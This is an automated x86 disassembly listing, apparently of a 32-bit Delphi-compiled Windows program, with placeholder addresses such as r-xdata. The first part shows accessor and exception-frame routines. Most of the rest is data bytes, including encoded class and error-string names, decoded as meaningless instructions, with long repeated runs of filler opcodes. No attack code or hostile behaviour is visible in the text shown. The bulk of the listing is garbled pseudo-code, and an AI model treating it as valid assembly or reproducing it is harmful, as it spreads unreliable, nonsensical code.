push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_41567c
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_415668
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_4156bc
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_415668
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4156fc
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_41573c
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_415774
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_41579c
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_4157d8
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_40595c
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_415858
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_40595c
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4158cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415912
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415919
retn
mov eax rw-data
call sub_4040ac
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404b54
sub_415944
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415969
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415970
retn
sub_4159c9
pop ecx
inc ecx
add [ ebx ] al
or dl [ esp + ecx * 2 + 0x65 ]
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x174
add [ eax ] al
add [ eax ] eax
add [ eax ] al
jl r-xdata
sbb [ edx + 0x64 ] ah
push edx
bound esp [ edx + edx * 2 + 0x69 ]
push 0x4c6f5474
je r-xdata
outsb
inc ecx
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
insb
or [ gs : ebx + 0x73 ] dh
popad
imul ebp [ fs : esi + 0x67 ] 0x796c6e4f
pop es
jae r-xdata
imul esp [ edi + 0x68 ] 0x4c6f5474
outsd
inc ecx
insb
imul esp [ edi + 0x6e ] 0x52646218
mov eax eax
pop edx
inc ecx
add [ ebx ] al
add ch [ esi ]
xor [ ecx ] eax
jae r-xdata
outsd
insb
pop es
inc ebx
insb
popad
jae r-xdata
add [ ecx ] al
or al 0x54
dec eax
insb
jo r-xdata
jae r-xdata
mov eax eax
rcr [ edx + 0x41 ] 0x1
je r-xdata
add [ ebx ] al
or [ eax + ecx * 2 + 0x65 ] edx
insb
jo r-xdata
push ebx
push 0x5746669
jae r-xdata
retn
inc eax
add ah dh
pop ecx
inc ecx
add [ ebx ] al
or [ edx + eax * 2 + 0x69 ] edx
inc esp
imul ecx [ ebp + 0x6f ] 0x16564
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al dh
pop ecx
inc ecx
add [ 0x654c6462 ] cl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + 0x74 ] ebp
inc ebx
outsd
outsb
add [ ecx ] ecx
push esp
push ebx
push 0x4374726f
jae r-xdata
popad
jae r-xdata
outsd
outsb
je r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
push es
shl [ edx + ebx * 2 + 0x41 ] 0x0
add eax [ edx ]
xor [ cs : ecx ] eax
add [ ecx ] al
add [ eax ] al
add al ch
pop edx
inc ecx
add [ ecx ] cl
insb
outsb
je r-xdata
jns r-xdata
push esp
inc ecx
insb
je r-xdata
add [ eax ] al
add [ eax + 0x5a ] ah
inc ecx
add [ edi ] al
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ esi ] al
outsd
push edx
imul esp [ edi + 0x68 ] 0x64620d74
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ebp
jb r-xdata
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00415b ] dh
add [ eax ] al
js r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ ebx + ebx * 2 ] bh
inc ecx
add [ eax ] cl
or al 0x54
dec esi
outsd
je r-xdata
mov eax 0x600415a
or edx [ ebx + edx * 2 + 0x68 ]
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : eax + 0x5a ] esp
inc ecx
add [ ebx + 0x415ad0c0 ] cl
jae r-xdata
je r-xdata
js r-xdata
dec edi
outsb
insb
jns r-xdata
jae r-xdata
jb r-xdata
push 0x79654b74
ja r-xdata
call 0x9419c5f
dec esp
je r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ gs : eax ] eax
push es
jae r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x415c 0x0
or al 0x0
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xd004032 ] ah
inc ebp
inc esi
inc ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 2 + 0x41 ] ch
add [ eax + eax ] cl
add [ eax ] al
rcr [ ebx + 0x41 ] 0x0
loopne r-xdata
outsd
jb r-xdata
push 0xe0004072
pop es
inc ebx
insb
inc ebp
mov al [ 0xc004032 ]
jns r-xdata
jae r-xdata
je r-xdata
outsd
dec esp
inc ebp
pop ebx
inc ecx
add [ ecx ] al
or [ ebx + edx * 2 + 0x68 ] edx
outsd
jb r-xdata
jb r-xdata
add al 0x1
add [ eax ] al
cmp bh 0xff
inc ebx
insb
popad
jae r-xdata
inc esp
outsd
jne r-xdata
or [ ebx + 0x73 ] dh
jae r-xdata
add [ ecx + edx ] al
inc eax
add [ ebp + 0x5bb00040 ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
lea eax [ eax ]
mov al 0x5b
add [ eax ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xb004032 ] ah
inc ebp
inc esi
dec edi
jo r-xdata
add [ eax + eax ] cl
add [ eax ] al
pop ebx
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xb004032 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
popad
je r-xdata
inc eax
add [ esp + ebx * 2 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 2 ] cl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
pop ebx
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x72 ] ch
inc eax
add al ah
jbe r-xdata
je r-xdata
push 0x6e6f4374
dec ebp
imul esp [ esp + 0x6c ] 0x73730865
push ebx
je r-xdata
xor al [ eax ]
or al 0x45
call 0x48419bd9
xor al [ eax ]
xor al [ fs : eax ]
jne r-xdata
inc ebx
dec ebx
jns r-xdata
push edx
imul esp [ edi + 0x68 ] 0x73730874
pop ebp
inc ecx
add [ eax + eax ] cl
add [ eax ] al
aam 0x5c
pop ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5d ] bh
outsb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
rcr [ ebx + 0x41 ] 0x0
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
pop esp
inc ecx
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
mov al 0x5b
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
pop esi
inc ecx
add [ eax + eax ] cl
add [ eax ] al
aam 0x5c
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebp + 0x41 ] bl
outsd
jb r-xdata
add [ eax + 0xc004032 ] ah
inc eax
add [ esp + ebx * 2 + 0x41 ] ch
add [ eax ] al
add [ eax ] al
xor al [ fs : eax ]
mov al [ 0xa004032 ]
outsd
je r-xdata
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
dec esi
outsd
je r-xdata
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
dec eax
xor al [ eax ]
xor al [ fs : eax ]
mov al [ 0xb004032 ]
rcr [ ebp + 0x41 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xb004032 ] ah
inc ebp
push edi
jb r-xdata
add ah dl
pop esp
inc ecx
add [ eax + eax ] cl
add [ eax ] al
aam 0x5c
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xa004032 ] ah
inc ebp
push edx
popad
inc ebp
jb r-xdata
pop ebp
inc ecx
pop ebp
inc ecx
add [ eax + 0x10004032 ] ah
inc ebp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
inc eax
ror al 0x5c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
push edx
jae r-xdata
xor al [ fs : eax ]
mov al [ 0xc004032 ]
cmp [ edi + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
pop edi
inc ecx
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xa004032 ] ah
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ esi + 0x41 ] bl
add [ eax + eax ] cl
outsd
jb r-xdata
push 0xe0004072
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
inc ecx
add [ eax + eax ] cl
add [ eax ] al
push 0xe0004072
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
xor al [ eax ]
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ edi + 0x41 ] bl
lea eax [ eax ]
loopne r-xdata
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xe004032 ] ah
inc ebp
inc ebx
insb
popad
jae r-xdata
pop esp
pop esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add [ eax ] al
push 0xe0004072
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xc004032 ] ah
nop
test [ esi + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 2 + 0xc0041 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41 ] cl
add [ eax ] dl
add [ eax ] al
add [ eax + 0x73 ] dl
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x44 ] ch
inc eax
add [ eax + 0xf004032 ] ah
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
pop esi
dec ecx
outsb
jbe r-xdata
shr [ ecx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
popad
inc ecx
add [ eax + eax ] ah
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] dl
add [ eax ] al
add [ eax - 0x1fffbff0 ] dh
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + ecx * 4 ] dh
inc ecx
add al bl
mov [ ecx ] eax
sbb [ ecx + eax * 2 + 0x41888800 ] cl
add [ ecx + ecx * 4 ] al
inc ecx
add [ 0x73694c54 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ecx + 0x41 ] ah
jne r-xdata
add [ edx + esi + 0x40 ] ah
add [ eax + 0xa004032 ] ah
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
nop
pop edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00415f ] dl
add [ eax ] al
add [ eax + 0x72 ] ch
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x10004032 ] ah
inc ebp
push ebx
je r-xdata
inc eax
add al dh
pop edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
pop edi
inc ecx
add [ eax + eax ] cl
add [ eax ] al
push 0xe0004072
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0xf004032 ] ah
inc ebp
inc ebx
outsd
insd
jo r-xdata
je r-xdata
add [ eax + 0x4004188 ] cl
mov [ ecx ] eax
add eax 0x73694c54
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x6108c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x74 ] dh
inc ecx
add [ ebx ] cl
push esp
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esp [ ecx + 0x41 ]
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah ah
lea eax [ ecx ]
add eax 0x74694254
jae r-xdata
inc eax
rcr [ eax ] 0x62
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
inc ecx
add [ edx ] dh
bound eax [ ecx ]
add al 0x0
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x6fffbe71 ] al
nop
inc ecx
add [ eax - 0x53ffbe70 ] bl
pop [ ecx ]
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
popad
inc ecx
arpl [ ebp + 0x73 ] sp
test al 0x60
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004160 ] ch
add [ eax ] al
add [ eax + 0x72 ] ch
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x11004032 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
xor al [ eax ]
push 0xa00040bc
xor al [ eax ]
cmovne ecx [ edi + 0x75 ]
je r-xdata
jb r-xdata
inc ebp
xor al [ eax ]
mov al [ 0x11004032 ]
push dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x60
inc ecx
add [ eax + eax ] cl
add [ eax ] al
push 0xe0004072
outsd
jb r-xdata
inc ebp
dec edi
jne r-xdata
pushad
inc ecx
add [ eax ] al
add [ eax ] al
sub_41628d
imul esp [ edx + 0x41 ] 0x41627700
add [ ecx + 0x1004162 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
lea esp [ edx + 0x41 ]
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x63080040 ] cl
inc ecx
add [ ecx + 0x4162 ] bl
add [ eax ] al
add [ eax ] bl
arpl [ ecx ] ax
inc esp
arpl [ ecx ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub ah [ ebx + 0x41 ]
add [ eax + eax ] cl
add [ eax ] al
int3
sub_416700
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
call 0xffffffffe041a911
outsb
dec ecx
je r-xdata
add [ edx + esi + 0x40 ] ah
add [ eax - 0x63ffbfce ] ah
imul ebp [ esi + 0x67 ] 0x7473694c
adc al 0x68
inc ecx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
fwait
inc ecx
add [ edx + ebp * 4 - 0x550fffbf ] bh
inc ecx
add ah dh
stosb [ edi ]
inc ecx
add al bh
stosb [ edi ]
inc ecx
add ah cl
lahf
inc ecx
add [ esp + ebp * 4 + 0x41 ] ch
add al cl
lodsb [ esi ]
inc ecx
add [ ebp + ebp * 4 - 0x5973ffbf ] bl
inc ecx
add al bl
lodsd [ esi ]
inc ecx
add [ esi + ebp * 4 + 0x41 ] cl
add [ eax - 0x58 ] dh
inc ecx
add [ eax + ebp * 4 + 0x41 ] bh
add [ eax ] ch
fwait
inc ecx
add [ eax ] bl
test eax 0xa9580041
inc ecx
add ah al
test eax 0x9f780041
inc ecx
add [ ebx + ebp * 4 + 0x41 ] dl
add [ eax + 0x540041a1 ] al
mov [ 0xffffffffab900041 ] al
inc ecx
add [ eax - 0x47ffbe55 ] ah
mov [ 0xffffffffa30c0041 ] al
inc ecx
add [ eax + 0x500041a3 ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x3c0041a5 ] ch
cmpsb [ esi ] [ edi ]
inc ecx
add al ah
test al 0x41
add ah bh
test al 0x41
add ah dh
stosd [ edi ]
inc ecx
add [ edx + ebp * 4 + 0x41 ] al
add [ esi + ebp * 4 ] al
inc ecx
add [ esi + ebp * 4 ] dl
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
pushfd
inc ecx
add al ah
insd
